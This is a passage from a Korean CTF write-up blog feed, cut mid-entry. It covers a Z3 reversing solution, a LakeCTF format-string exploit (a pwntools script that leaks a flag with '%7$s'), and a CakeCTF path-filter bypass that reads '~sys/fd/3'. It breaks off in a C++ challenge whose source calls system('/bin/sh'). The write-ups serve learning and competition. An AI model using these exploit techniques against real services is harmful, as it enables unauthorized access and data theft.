ì´ë‹¤.<br><code>BitVec(&quot;&quot;, ë¹„íŠ¸ìˆ˜)</code>ë¡œ ì •ì˜í•´ì•¼ í•œë‹¤. ì™œëƒí•˜ë©´ ì´ ë¬¸ì œì—ì„œ ì‚¬ìš©ìž ì¸í’‹ì„ ê°€ì§€ê³  ë¹„íŠ¸ì—°ì‚°ì„ ì§„í–‰í•˜ëŠ”ë° <code>Int()</code>ë¡œ ì„ ì–¸í•˜ë©´ TypeErrorê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: unsupported operand type(s) for &gt;&gt;: &#x27;instance&#x27; and &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>ê·¸ëž˜ì„œ ë¹„íŠ¸ì—°ì‚°ì„ í•  ë•ŒëŠ” ë¹„íŠ¸ì—°ì‚°ì„ ìœ„í•œ <code>BitVec()</code>ìœ¼ë¡œ ì„ ì–¸ì„ í•´ì¤˜ì•¼ í•œë‹¤.</p><p>ë‘ ë²ˆì§¸ í–ˆë˜ ì‹¤ìˆ˜ëŠ” ë‹¨ìˆœí•˜ë‹¤. ê·¸ëƒ¥ ë¯¸ì§€ìˆ˜ ì•„ë‹Œë° ë¯¸ì§€ìˆ˜ë¡œ ì„ ì–¸í•´ì¤¬ë‹¤. ê·¸ëŸ¬ë©´ ì•ˆëœë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br></pre></td></tr></table></figure><p>íŒŒì´ì¬ìœ¼ë¡œ ì—°ì‚° ì½”ë“œë¥¼ ìž‘ì„±í•´ì¤€ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br></pre></td></tr></table></figure><p><code>Z3 solver</code>ëŠ” <code>Solver</code> ê°ì²´ë¥¼ ì§€ì›í•´ì¤€ë‹¤. ì´ ê°ì²´ë¥¼ ì‚¬ìš©í•´ë³´ìž. <code>s.add(ìˆ˜ì‹)</code>ë¡œ iptì— ëŒ€í•œ ì œì•½ ì¡°ê±´ ë° ê°’ì„ êµ¬í•˜ëŠ” ì¡°ê±´ë„ ì¶”ê°€í•´ì¤¬ë‹¤.</p><p><a href="https://z3prover.github.io/api/html/classz3py_1_1_solver.html">Sovler ê°ì²´ ì°¸ê³  ë§í¬</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># dupule check</span></span><br></pre></td></tr></table></figure><p><code>s.check()</code>ëŠ” í•´ë‹¹ ë°©ì ì‹ì„ ë§Œì¡±í•˜ëŠ” ê°’(ì •ë‹µ, í•´)ì´ ìžˆëŠ”ì§€ ì²´í¬í•´ì¤€ë‹¤. ê°’ì´ ìžˆìœ¼ë©´ <code>sat</code>, ì—†ìœ¼ë©´ <code>unsat</code>, í•´ê²°í•  ìˆ˜ ì—†ìœ¼ë©´ <code>unknown</code>ì„ ë°˜í™˜í•œë‹¤ê³  í•œë‹¤.</p><p>ì´ ë¬¸ì œëŠ” ê°’ì´ ì—¬ëŸ¬ ê°œê°€ ë‚˜ì˜¤ë¯€ë¡œ ì¤‘ë³µ ì²´í¬ë„ í•´ì£¼ì—ˆë‹¤. ë°©ê¸ˆ êµ¬í•œ iptì˜ ê°’ì„ ì œì™¸í•œ ë‹¤ë¥¸ ê°’ì„ êµ¬í•  ìˆ˜ ìžˆë‹¤.</p><p><code>s.model()</code>ì€ <code>s.check()</code>ê°€ <code>sat</code>ì¼ ë•Œ ë§Œì¡±í•˜ëŠ” í•´ ì¤‘ í•˜ë‚˜ë¥¼ ë°˜í™˜í•œë‹¤.</p><h4 id="ìµœì¢…-ì½”ë“œ"><a href="#ìµœì¢…-ì½”ë“œ" class="headerlink" title="ìµœì¢… ì½”ë“œ"></a><strong>ìµœì¢… ì½”ë“œ</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    key = ((ipt &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(ipt - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>)</span><br><span class="line">s.add(<span class="number">0</span> &lt; ipt)</span><br><span class="line">s.add(ipt == key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    s.add(ipt != s.model()[ipt]) <span class="comment"># duplicate check</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://tistory.d1n0.me/18">https://tistory.d1n0.me/18</a><br><a href="https://realsung.tistory.com/185">https://realsung.tistory.com/185</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Way to simple (32bit, fsb)</title>
      <link href="/221003-lakectf2022-way_too_simple/"/>
      <url>/221003-lakectf2022-way_too_simple/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬, ë„ì»¤íŒŒì¼</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?</span><br></pre></td></tr></table></figure><h3 id="íŒŒì¼-ì •ë³´"><a href="#íŒŒì¼-ì •ë³´" class="headerlink" title="íŒŒì¼ ì •ë³´"></a>íŒŒì¼ ì •ë³´</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exe: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=ad8d3e5e9cf076847f4c23ee0443e19aa7170e7c, stripped</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>ì´ ë¬¸ì œëŠ” ì·¨ì•½ì ì„ ì„¤ëª…í•˜ê¸°ì— ì•žì„œ í•  ë§ì´ ì¡°ê¸ˆ ìžˆë‹¤.. ã…‹ã…‹</p><p>ë¬¸ì œ ì‹¤í–‰ì„ í•˜ë ¤ëŠ”ë° ì•„ëž˜ì™€ ê°™ì´ ë¬¸ì œ ì‹¤í–‰ì´ ì•ˆë˜ì–´ì„œ ì¡°ê¸ˆ ë‹¹í™©í–ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ ./exe </span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>êµ³ì´ ì‹¤í–‰í•˜ë ¤í•˜ì§€ë§ê³  ë„ì»¤íŒŒì¼ ì£¼ì–´ì¡ŒëŠ”ë° buildí•˜ê³  run í•˜ë©´ ë˜ì§€ ì•Šì•„? ë¼ê³  í•œë‹¤ë©´.. í•  ë§ì´ ì—†ê¸´ í•˜ë‹¤. <code>docker build</code>ëŠ” ì„±ê³µí–ˆìœ¼ë‚˜ <code>docker run</code>ì´ ì œëŒ€ë¡œ ë˜ì§€ ì•Šì•˜ëŠ”ë°, ì´ìœ ëŠ” ë”±ížˆ ì•Œì•„ë³´ì§€ ì•Šì•˜ë‹¤. ì™œëƒë©´ ê·¸ ê³¼ì •ì—ì„œ IDAë¡œ ë°”ì´ë„ˆë¦¬ ì—´ì—ˆë”ë‹ˆ êµ³ì´ ë¡œì»¬ì—ì„œ ì‹¤í–‰ì‹œí‚¤ì§€ ì•Šì•„ë„ í’€ ìˆ˜ ìžˆì„ ê²ƒ ê°™ì•˜ê¸° ë•Œë¬¸ì´ë‹¤. ã…Ž</p><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><p>ì¼ë‹¨ ë¬¸ì œì—ì„œ ì œê³µëœ ë°”ì´ë„ˆë¦¬ëŠ” 32bit ë°”ì´ë„ˆë¦¬ì´ë‹¤. IDAë¡œ ì—´ì–´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">128</span>]; <span class="comment">// [esp+Ch] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_1111AE20(off_111B9498, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B9494, <span class="number">0</span>);</span><br><span class="line">  sub_1111AE20(off_111B949C, <span class="number">0</span>);</span><br><span class="line">  flag_addr = (<span class="type">int</span>)read_flag();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is at %p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)flag_addr);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your magical spell! &quot;</span>);</span><br><span class="line">  sub_111187E0(<span class="string">&quot;%127[^\n]&quot;</span>, input);</span><br><span class="line">  <span class="built_in">printf</span>(input);                                <span class="comment">// fsb</span></span><br><span class="line">  sub_111191B0((<span class="type">int</span>)<span class="string">&quot;\nHope you got what you wanted!&quot;</span>);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v5 )</span><br><span class="line">    sub_11137030();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stripped fileì´ë¼ì„œ í•¨ìˆ˜ëª…ì´ ë‹¤ <code>sub_XX</code>ë¡œ ì‹œìž‘í•˜ê³  ìžˆì—ˆë‹¤. ê·¸ëž˜ì„œ ì´ë¦„ì„ ì¡°ê¸ˆ ë°”ê¿”ì¤¬ë‹¤.</p><p><code>read_flag()</code> í•¨ìˆ˜ì—ì„œ flagë¥¼ opení•´ì„œ readí•˜ëŠ”ë° ê·¸ readí•œ ì£¼ì†Œë¥¼ ë°˜í™˜í•œë‹¤.</p><p>ê²°êµ­ flag ìœ„ì¹˜ë¥¼ ì¶œë ¥í•´ì£¼ê³ , ìš°ë¦¬ì—ê²Œ inputì„ ë°›ëŠ”ë‹¤.</p><p>ì—¬ê¸°ì„œ í¬ì¸íŠ¸ëŠ” ìš°ë¦¬ inputì„ printfë¡œ ì¶œë ¥í•´ì¤„ ë•Œ í¬ë§· ìŠ¤íŠ¸ë§ ì—†ì´ ì¶œë ¥ì„ í•´ì¤€ë‹¤ëŠ” ê²ƒì´ë‹¤. ê·¸ëŸ¬ë©´ <strong>fsb ì·¨ì•½ì </strong>ì´ ë°œìƒí•˜ê²Œ ëœë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ nc chall.polygl0ts.ch 16000</span><br><span class="line">The flag is at 0x12c1a420</span><br><span class="line">Input your magical spell! AAAA %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">AAAA 0xffad03cc 0xffad0458 0x11111838 0x1118c5cf 0x32323032 0x2a 0x41414141 0x20702520 0x25207025 0x70252070</span><br><span class="line">Hope you got what you wanted!</span><br></pre></td></tr></table></figure><p>offsetì€ 7ìž„ì„ ì•Œ ìˆ˜ ìžˆë‹¤. </p><p>ì°¸ê³ ë¡œ 32bit í™˜ê²½ì—ì„œì˜ fsb ì·¨ì•½ì ì— ëŒ€í•œ ë‚´ìš©ì€ ë‚˜ì˜ <a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">êµ¬ í‹°ìŠ¤í† ë¦¬ ë¸”ë¡œê·¸</a>ì— ìžì„¸ížˆ ì„¤ëª…ë˜ì–´ ìžˆë‹¤.</p><p><a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">32bitì—ì„œ FSB (Format String Bug) ì´í•´í•˜ê¸° -(1)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-2?category=899454">32bitì—ì„œ FSB (Format String Bug) ì´í•´í•˜ê¸° -(2)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-3?category=899454">32bitì—ì„œ FSB (Format String Bug) ì´í•´í•˜ê¸° -(3) (ì™„)</a></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">16000</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;flag address :: &#x27;</span> + <span class="built_in">hex</span>(flag))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += <span class="string">&quot;%7$s&quot;</span>    <span class="comment"># offset is 7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;spell!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] flag address :: 0x12fe0420</span><br><span class="line"> \x04\x127$s</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">  \x04\x12PFL&#123;format_string_are_way_too_old&#125;</span><br><span class="line">Hope you got what you wanted!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>flagê°€ ì´ëŸ°ì‹ìœ¼ë¡œ ì¶œë ¥ì´ ë˜ëŠ”ë°, flag í¬ë§·ì— ë§žê²Œ ì¡°ê¸ˆ ë§Œì ¸ì£¼ê¸°ë§Œ í•˜ë©´ ëœë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EPFL&#123;format_string_are_way_too_old&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - readme2022 (misc)</title>
      <link href="/220928-cakectf2022-readme2022/"/>
      <url>/220928-cakectf2022-readme2022/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ì†ŒìŠ¤ì½”ë“œ(python)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found. If this message shows up&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    on the remote server, please report to amdin.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filepath = <span class="built_in">input</span>(<span class="string">&quot;filepath: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> filepath.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not start with &#x27;/&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not contain &#x27;..&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    filepath = os.path.expanduser(filepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">&quot;[-] Could not open file&quot;</span>)</span><br></pre></td></tr></table></figure><p>ì œê³µëœ server.py ì†ŒìŠ¤ì½”ë“œ ì „ë¬¸ì´ë‹¤.</p><p>ì½”ë“œë¥¼ ì½ë‹¤ë³´ë©´ ë­”ê°€ í•µì‹¬ì¸ ê²ƒ ê°™ì€ ë¶€ë¶„ì„ ì°¾ì„ ìˆ˜ ìžˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.expanduser(filepath)</span><br></pre></td></tr></table></figure><p><code>filepath</code>ì— <code>~&lt;username&gt;</code>ë¥¼ ìž…ë ¥í•œë‹¤ë©´ home ë””ë ‰í† ë¦¬ pathê°€ ë°”ë€Œê²Œ ë˜ëŠ”ë° ì´ê²ƒì„ ì´ìš©í•˜ì—¬ ë¬¸ì œë¥¼ í‘¸ëŠ” ê²ƒì´ë‹¤.</p><p>ì†ŒìŠ¤ì½”ë“œê°€ ì œê³µë˜ì—ˆìœ¼ë‹ˆê¹Œ filepathë¥¼ ì¶œë ¥í•´ì„œ í™•ì¸í•´ë³´ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~</span><br><span class="line">/home/jir4vvit</span><br><span class="line">[-] Could not open file</span><br><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~test</span><br><span class="line">/home/test</span><br><span class="line">[-] Could not open file</span><br></pre></td></tr></table></figure><p>ì´ëŸ° ëŠë‚Œì´ë‹¤..</p><p><code>/etc/passwd</code>ì„ í™•ì¸í•˜ë©´ ì•„ëž˜ì™€ ê°™ì€ ì •ë³´ê°€ ìžˆëŠ”ë°,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>sys ì‚¬ìš©ìžì˜ home ë””ë ‰í† ë¦¬ê°€ <code>/dev</code>ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìžˆë‹¤.</p><p>ë”ë¶ˆì–´ ë¬¸ì œì—ì„œ <code>/flag.txt</code>ë¥¼ opení•˜ê³  closeí•˜ì§€ ì•Šì•˜ìŒìœ¼ë¡œ file descriptorê°€ ê³„ì† ì‚´ì•„ìžˆìŒì„ ì•Œ ìˆ˜ ìžˆë‹¤. (!)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py</span><br><span class="line">filepath: ~sys/fd/3</span><br><span class="line">flag&#123;fake_flag&#125;</span><br></pre></td></tr></table></figure><p>ì„¤ëª…ì„ ì¡°ê¸ˆ ì¶”ê°€í•˜ìžë©´, ì§€ê¸ˆ sys ì‚¬ìš©ìžì˜ í™ˆ ë””ë ‰í† ë¦¬ë¡œ ë³€ê²½ë˜ì—ˆìœ¼ë‹ˆ <code>/dev</code>ê°€ filepath(homepath)ê°€ ë˜ì—ˆê³ , ì •í™•ížˆëŠ” <code>/dev/fd/3</code>ì— ì ‘ê·¼í•œ ê²ƒì´ë‹¤.</p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>ê°œì¸ì ìœ¼ë¡œ ìž¬ë¯¸ìžˆëŠ” ë¬¸ì œë¼ê³  ìƒê°ë˜ì–´ ë¸”ë¡œê·¸ì— ê¼­ ê¸°ë¡í•˜ê³  ì‹¶ì—ˆë‹¤.</p><p>ì•„, File Descriptorì— ëŒ€í•œ ì„¤ëª…ì€ ë‚˜ì˜ ê³¼ê±° <a href="https://jiravvit.tistory.com/entry/%ED%8C%8C%EC%9D%BC-%EB%94%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%84%B0-File-Descriptor">í‹°ìŠ¤í† ë¦¬ ë¸”ë¡œê·¸</a>ì— ìžˆë‹¤. ã…Ž</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Cake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - str.vs.cstr (cpp)</title>
      <link href="/220928-cakectf2022-str_vs_c.str/"/>
      <url>/220928-cakectf2022-str_vs_c.str/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬, ì†ŒìŠ¤ì½”ë“œ(cpp)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="built_in">Test</span>() &#123; std::<span class="built_in">fill</span>(_c_str, _c_str + <span class="number">0x20</span>, <span class="number">0</span>); &#125;</span><br><span class="line">  <span class="function"><span class="type">char</span>* <span class="title">c_str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _c_str; &#125;</span><br><span class="line">  <span class="function">std::string&amp; <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _str; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  __attribute__((used))</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">call_me</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> _c_str[<span class="number">0x20</span>];</span><br><span class="line">  std::string _str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Test êµ¬ì¡°ì²´ì— 0x20 í¬ê¸°ì˜ <code>_c_str</code>ë¥¼ ì •ì˜í•´ë†¨ë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// set 